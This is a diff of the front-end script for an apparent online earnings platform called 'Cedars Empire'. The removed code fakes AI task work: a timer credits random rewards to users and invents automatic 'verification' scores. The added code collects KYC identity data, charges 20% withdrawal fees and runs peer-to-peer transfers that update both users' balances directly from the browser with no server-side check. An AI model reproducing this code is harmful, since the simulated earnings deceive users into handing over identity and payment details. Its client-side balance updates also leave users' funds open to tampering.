+    const {error}=await supabase.from('kyc').insert({user_id:currentUser.id,full_name:fullName,country:country,id_number:idNumber,doc_type:document.getElementById('docType').value,doc_front_name:docFile?docFile.name:null,selfie_name:selfieFile?selfieFile.name:null,status:'pending'});
+    if(error) throw error;
+    document.getElementById('kycMsg').innerText='✅ KYC Submitted - Waiting for approval';
+    alert('✅ KYC Submitted! Country: '+country);
+    loadProfile();
+  }catch(e){ document.getElementById('kycMsg').innerText='Error: '+e.message; alert('KYC FAILED: '+e.message); }
+  btn.innerText='Submit KYC for Verification'; btn.disabled=false;
 }
-function closeProfile(){ document.getElementById('profileModal').classList.remove('open'); }
-async function saveProfile(){
-  let name=document.getElementById('profileName').value.trim();
-  if(!name) return alert("Enter full name");
-  let {error}=await client.from('profiles').upsert({id:currentUser.id,email:currentUser.email,full_name:name});
-  if(error) return alert(error.message);
-  alert("Profile saved"); closeProfile();
+async function doWithdraw(){
+  const method=document.getElementById('withdrawMethod').value;
+  const isCrypto=method==='Crypto';
+  const currency=isCrypto?document.getElementById('cryptoCurrency').value:document.getElementById('withdrawCurrency').value;
+  const amount=parseFloat(isCrypto?document.getElementById('cryptoAmount').value:document.getElementById('withdrawAmount').value);
+  const bankName=document.getElementById('bankName').value.trim();
+  const bankDetails=document.getElementById('bankDetails').value.trim();
+  const paypalEmail=document.getElementById('paypalEmail').value.trim();
+  const cryptoWallet=document.getElementById('cryptoWalletAddress').value.trim();
+  const cryptoNetwork=document.getElementById('cryptoNetwork').value.trim();
+  if(!currentUser) return alert("Please login first");
+  if(!amount||amount<=0) return alert("Enter a valid amount");
+  // MIN / MAX CHECK
+  if(!isCrypto && (amount<100 || amount>20000)) return alert("Withdraw must be between $100 and $20,000");
+  if(isCrypto && currency==='USDT' && (amount<100 || amount>20000)) return alert("USDT Withdraw must be between 100 and 20000");
+  if(isCrypto && (currency==='BTC'||currency==='ETH') && amount<0.002) return alert("BTC/ETH Min is 0.002");
+  if(amount>avail) return alert("Not enough Available Balance. You have €"+avail.toFixed(2));
+  if(method==='Bank Transfer'&&(!bankName||!bankDetails)) return alert("Fill Bank Account Name and Details");
+  if(method==='PayPal'&&!paypalEmail) return alert("Enter PayPal Email");
+  if(method==='Crypto'&&!cryptoWallet) return alert("Enter Crypto Wallet Address");
+  if(currentKycStatus!=='verified'){alert("Please complete KYC first and wait for approval");document.getElementById('kycCard').scrollIntoView({behavior:'smooth'});return;}
+  let fee=amount*0.20; let net=amount-fee;
+  if(!confirm(`Confirm Withdraw?\n\nYou Withdraw: ${amount} ${currency}\nFee (20%): -${fee.toFixed(2)} ${currency}\nYou Receive: ${net.toFixed(2)} ${currency}\nMethod: ${method}`)) return;
+  document.getElementById('withdrawMsg').innerText='Sending...';
+  const {error}=await supabase.from('withdrawals').insert({user_id:currentUser.id,amount:amount,gross_amount:amount,fee:fee,net_amount:net,currency:currency,method:method,bank_name:method==='Bank Transfer'?bankName:null,bank_details:method==='Bank Transfer'?bankDetails:(method==='Crypto'&&cryptoNetwork?'Network: '+cryptoNetwork:null),paypal_email:method==='PayPal'?paypalEmail:null,crypto_wallet_address:method==='Crypto'?cryptoWallet:null,crypto_currency:method==='Crypto'?currency:null,status:'pending'});
+  if(error){document.getElementById('withdrawMsg').innerText="Error: "+error.message;alert("Withdraw failed: "+error.message);return;}
+  document.getElementById('withdrawMsg').innerText=`✅ Withdraw sent! You get ${net.toFixed(2)} ${currency} after 20% fee - PENDING`;
+  loadWithdrawals();
 }
-function showReferral(){
-  if(!currentUser) return alert("Login first");
-  alert('Your Referral: https://cedarsempire.com/register?ref='+currentUser.id.slice(0,8));
+async function doP2P(){
+  const toId=document.getElementById('p2pTo').value.trim().toUpperCase();
+  const amount=parseFloat(document.getElementById('p2pAmount').value);
+  if(!currentUser) return alert("Please login first");
+  if(!toId) return alert("Enter Receiver Cedars ID e.g. CDAB1234");
+  if(toId===myCedarsId) return alert("You cannot send to yourself");
+  if(!amount||amount<=0) return alert("Enter valid amount");
+  if(amount>avail) return alert("Not enough balance. You have €"+avail.toFixed(2));
+  let fee=amount*0.05; let net=amount-fee;
+  if(!confirm(`Confirm P2P?\n\nTo: ${toId}\nYou Send: ${amount}\nFee (5%): -${fee.toFixed(2)}\nReceiver Gets: ${net.toFixed(2)}`)) return;
+  document.getElementById('p2pMsg').innerText='Sending...';
+  // Find receiver
+  const {data:receiver,error:rErr}=await supabase.from('profiles').select('id,cedars_id,email').eq('cedars_id',toId).maybeSingle();
+  if(rErr||!receiver){ document.getElementById('p2pMsg').innerText='Receiver not found'; return alert("Receiver Cedars ID not found: "+toId); }
+  // Get balances
+  const {data:senderBal}=await supabase.from('balances').select('*').eq('user_id',currentUser.id).maybeSingle();
+  const {data:receiverBal}=await supabase.from('balances').select('*').eq('user_id',receiver.id).maybeSingle();
+  if(!senderBal || parseFloat(senderBal.available_balance||0)<amount) return alert("Not enough balance");
+  // Update balances
+  await supabase.from('balances').update({available_balance:parseFloat(senderBal.available_balance)-amount}).eq('user_id',currentUser.id);
+  if(receiverBal){ await supabase.from('balances').update({available_balance:parseFloat(receiverBal.available_balance||0)+net,earned_balance:parseFloat(receiverBal.earned_balance||0)+net}).eq('user_id',receiver.id); }
+  else { await supabase.from('balances').insert({user_id:receiver.id,available_balance:net,earned_balance:net,amount:net}); }
+  // Log transfer
+  await supabase.from('p2p_transfers').insert({sender_id:currentUser.id,receiver_id:receiver.id,sender_cedars_id:myCedarsId,receiver_cedars_id:toId,amount:amount,fee:fee,net_amount:net,status:'completed'});
+  await supabase.from('transactions').insert([{user_id:currentUser.id,type:'p2p_sent',amount:-amount,note:'P2P to '+toId+' Fee '+fee.toFixed(2)},{user_id:receiver.id,type:'p2p_received',amount:net,note:'P2P from '+myCedarsId}]);
+  document.getElementById('p2pMsg').innerText=`✅ Sent! Receiver ${toId} got ${net.toFixed(2)} after 5% fee`;
+  alert(`✅ P2P Sent!\nTo: ${toId}\nReceiver gets: ${net.toFixed(2)}`);
+  loadProfile();
 }
-async function aiGenerateTasks(){ let pool=["Vision: Label image","Transcription: Audio 30s","Rating: Rate response","Data: Clean dataset","Text: Summarize paragraph"]; let picked=pool[Math.floor(Math.random()*pool.length)]; aiLog('AI Sourcing: New task generated - '+picked); return picked; }
-async function aiAssignTask(task){ let active=engines.filter(e=>e.on); if(!active.length) return null; let best=active.reduce((a,b)=>a.tasks<=b.tasks?a:b); aiLog('AI Assignment: '+task+' -> '+best.name+' Engine (lowest load)'); return best; }
-async function aiVerifyLast(){ if(!lastTaskInfo){ aiLog('AI Verification: No task yet to verify'); return; } let score=(92+Math.random()*7).toFixed(1); aiLog('AI Verification: '+lastTaskInfo+' PASSED - Score '+score+'% - Auto-approved'); }
-async function aiSupport(){ aiLog('AI Support: Balance €'+availableBal.toFixed(2)+' | Earned €'+earned.toFixed(2)); alert('🤖 AI Support\n\nYour Available: €'+availableBal.toFixed(2)+'\nEarned: €'+earned.toFixed(2)+'\nActive Engines: '+engines.filter(e=>e.on).length+'\n\nAI is monitoring your account 24/7.'); }
-function aiToggleAuto(){ aiAuto=!aiAuto; document.getElementById('aiMode').innerText=aiAuto?'• AUTO MODE: ON':'• AUTO MODE: OFF'; aiLog('AI Auto Mode '+(aiAuto?'ENABLED':'PAUSED')); }
-async function runCycle(){
+async function loadWithdrawals(){
   if(!currentUser) return;
-  let activeEngines=engines.filter(e=>e.on); if(activeEngines.length===0) return;
-  let taskName=await aiGenerateTasks();
-  let e=await aiAssignTask(taskName)||activeEngines[Math.floor(Math.random()*activeEngines.length)];
-  let w=workerNames[Math.floor(Math.random()*workerNames.length)];
-  let reward=(Math.random()*0.5+0.3);
-  earned+=reward; availableBal+=reward*0.2; centralReserve+=reward*0.8; totalTasks++; e.tasks++;
-  lastTaskInfo=w+' in '+e.name+' - '+taskName;
-  await saveBalance();
-  await client.from('transactions').insert({user_id:currentUser.id,type:'task',amount:reward,note:lastTaskInfo});
-  updateDisplay();
-  document.getElementById('workersLive').innerHTML='<div><span class="dot"></span> Worker #'+String(totalTasks).padStart(3,'0')+' - '+w+' - '+e.name+' - Working</div><div style="margin-top:8px;color:#0a7a55">✅ Last: '+lastTaskInfo+' completed +€'+reward.toFixed(2)+'</div>';
-  document.getElementById('taskTable').innerHTML=engines.map(en=>'<tr><td>'+en.name+'</td><td>'+en.tasks+' tasks</td><td><span class="pill">'+(en.on?'Active':'Idle')+'</span></td><td>Just now</td></tr>').join('');
-  if(aiAuto && totalTasks%3===0){ aiLog('AI Verification: Auto-verified last 3 tasks - All passed'); }
+  const {data,error}=await supabase.from('withdrawals').select('*').eq('user_id',currentUser.id).order('created_at',{ascending:false}).limit(20);
+  if(error){document.getElementById('withdrawList').innerText='Error: '+error.message;return;}
+  if(!data||!data.length){document.getElementById('withdrawList').innerText='No withdrawals yet.';return;}
+  document.getElementById('withdrawList').innerHTML='<table><tr><th>Gross</th><th>Fee 20%</th><th>You Get</th><th>Method</th><th>Status</th><th>Date</th></tr>'+data.map(w=>`<tr><td>${w.gross_amount||w.amount} ${w.currency}</td><td>${(w.fee??(w.amount*0.2)).toFixed(2)}</td><td><b>${(w.net_amount??(w.amount*0.8)).toFixed(2)}</b></td><td>${w.method}</td><td>${w.status}</td><td>${new Date(w.created_at).toLocaleDateString()}</td></tr>`).join('')+'</table>';
 }
-client.auth.getSession().then(({data})=>{ if(data.session) afterLogin(); });
-setInterval(()=>{ if(currentUser) runCycle(); },5000);
+async function loadP2P(){
+  if(!currentUser) return;
+  const {data}=await supabase.from('p2p_transfers').select('*').or(`sender_id.eq.${currentUser.id},receiver_id.eq.${currentUser.id}`).order('created_at',{ascending:false}).limit(10);
+  if(!data||!data.length){document.getElementById('p2pList').innerHTML='No P2P yet.';return;}
+  document.getElementById('p2pList').innerHTML='<table><tr><th>From</th><th>To</th><th>Sent</th><th>Fee 5%</th><th>Received</th></tr>'+data.map(t=>`<tr><td>${t.sender_cedars_id}</td><td>${t.receiver_cedars_id}</td><td>${t.amount}</td><td>${t.fee}</td><td>${t.net_amount}</td></tr>`).join('')+'</table>';
+}
+updateMethodFields(); loadProfile();
 </script>
 </body>
 </html>
